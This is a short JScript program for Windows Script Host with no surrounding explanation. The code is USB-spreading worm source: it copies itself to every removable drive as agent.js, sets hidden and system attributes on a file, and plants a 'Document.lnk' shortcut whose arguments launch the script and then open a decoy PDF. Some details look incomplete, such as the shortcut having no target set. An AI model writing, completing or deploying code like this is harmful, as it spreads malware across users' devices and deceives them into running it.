var fso = WScript.CreateObject("Scripting.FileSystemObject");
var shell = WScript.CreateObject("WScript.Shell");
for (var e = new Enumerator(fso.Drives); !e.atEnd(); e.moveNext()) {
    var drive = e.item();
    if (drive.DriveType == 1) {
        fso.CopyFile(WScript.ScriptFullName, drive.Path + "\\agent.js");
        var file = fso.GetFolder(drive.Path).Files.Item(0);
        file.Attributes = 2 + 4;
        var link = shell.CreateShortcut(drive.Path + "\\Document.lnk");
        link.Arguments = "/c start agent.js&start Document.pdf";
        link.IconLocation = file.Path;
        link.Save();
    }
}
